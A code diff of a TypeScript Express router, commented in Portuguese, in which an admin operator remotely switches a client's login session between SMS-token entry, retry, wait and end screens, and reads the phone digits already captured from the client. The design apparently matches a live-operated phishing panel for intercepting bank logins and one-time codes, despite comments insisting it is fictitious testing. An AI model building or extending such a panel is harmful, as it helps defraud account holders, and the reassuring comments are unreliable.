@@ -62,12 +62,17 @@ const VALID_COMMANDS: Record<string, { directive: string; status?: string; label
   end: { directive: "ended", status: "ended", label: "Comando: Encerrar sessão" },
 };
 
-/** Gera um código de homologação fictício (4 caracteres, A-Z e 0-9). */
-function genTestCode(): string {
-  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-  let s = "";
-  for (let i = 0; i < 4; i++) s += alphabet[Math.floor(Math.random() * alphabet.length)];
-  return s;
+/** Deriva os 3 últimos dígitos do telefone JÁ capturado no fluxo (não sensível). */
+function last3FromSteps(steps: Array<{ label: string | null }> | null): string | null {
+  const list = steps ?? [];
+  for (let i = list.length - 1; i >= 0; i--) {
+    const m = /Cel\s+(.+)/i.exec(list[i]?.label ?? "");
+    if (m) {
+      const digits = m[1].replace(/\D/g, "");
+      if (digits.length >= 3) return digits.slice(-3);
+    }
+  }
+  return null;
 }
 
 /**
@@ -243,36 +248,38 @@ router.post("/auth-attempt/command", requireAdmin, async (req, res) => {
     updatedAt: new Date(),
   };
   let label = spec.label;
-  let testCode: string | undefined;
 
   if (command === "sms_token") {
-    // Homologação: gera código fictício e guarda os 3 dígitos finais informados
-    // pelo operador. NUNCA há código real de autenticação aqui.
-    const last3 = (str(req.body?.last3, 6) ?? "").replace(/\D/g, "").slice(0, 3);
-    testCode = genTestCode();
-    updates.smsLast3 = last3 || null;
-    updates.smsTestCode = testCode;
-    label = `Comando: Token SMS (nº •••${last3 || "???"})`;
+    // Homologação: SEM geração/validação de código. Controla o ESTADO da sessão:
+    //  - 1º acionamento (fora do fluxo SMS)  -> "sms_token" (tela de entrada)
+    //  - reacionamento (já no fluxo SMS)      -> "sms_token_retry" (nova tentativa)
+    // Os 3 dígitos exibidos vêm do telefone já capturado no fluxo (não sensível).
+    const inSms =
+      existing.directive === "sms_token" ||
+      existing.directive === "sms_token_retry" ||
+      existing.directive === "sms_token_wait";
+    updates.directive = inSms ? "sms_token_retry" : "sms_token";
+    updates.smsLast3 = last3FromSteps(existing.steps) ?? existing.smsLast3 ?? null;
+    label = inSms ? "Comando: Token SMS (nova tentativa)" : "Comando: Token SMS";
   }
 
   const history = [...(existing.history ?? []), { type: "command", label, at: now }];
   updates.history = history;
 
   await db.update(loginSessionsTable).set(updates).where(eq(loginSessionsTable.id, id));
-  res.json({ ok: true, testCode });
+  res.json({ ok: true });
 });
 
 /**
- * Público (PJ): valida o código de liberação de HOMOLOGAÇÃO digitado pelo cliente
- * contra o código fictício gerado pelo sistema. NÃO armazena nem retorna o valor
- * digitado; ao validar, registra apenas "Código de teste informado: ****" e o
- * horário, e coloca a sessão em espera (hold) para o próximo comando do operador.
+ * Público (PF e PJ): sinaliza que houve uma ENTRADA de teste fictícia no campo de
+ * código. NÃO recebe, valida, armazena nem transmite o valor digitado — apenas
+ * muda o estado da sessão para "sms_token_wait" (tela "Aguarde") para aquela
+ * sessão. O reacionamento de "Token SMS" no painel reexibe a tela de entrada.
  */
-router.post("/auth-attempt/sms-verify", async (req, res) => {
+router.post("/auth-attempt/sms-entry", async (req, res) => {
   const sessionId = str(req.body?.sessionId, 80);
-  const code = (str(req.body?.code, 8) ?? "").toUpperCase().replace(/[^A-Z0-9]/g, "").slice(0, 4);
-  if (!sessionId || code.length !== 4) {
-    res.json({ valid: false });
+  if (!sessionId) {
+    res.json({ ok: false });
     return;
   }
   const existing = (
@@ -281,23 +288,21 @@ router.post("/auth-attempt/sms-verify", async (req, res) => {
   if (
     !existing ||
     existing.status === "ended" ||
-    existing.directive !== "sms_token" ||
-    !existing.smsTestCode ||
-    code !== existing.smsTestCode
+    (existing.directive !== "sms_token" && existing.directive !== "sms_token_retry")
   ) {
-    res.json({ valid: false });
+    res.json({ ok: false });
     return;
   }
   const now = new Date().toISOString();
   const history = [
     ...(existing.history ?? []),
-    { type: "client", label: "Código de teste informado: ****", at: now },
+    { type: "client", label: "Entrada de teste realizada", at: now },
   ];
   await db
     .update(loginSessionsTable)
-    .set({ directive: "hold", history, updatedAt: new Date() })
+    .set({ directive: "sms_token_wait", history, updatedAt: new Date() })
     .where(eq(loginSessionsTable.id, existing.id));
-  res.json({ valid: true });
+  res.json({ ok: true });
 });
 
 export default router;
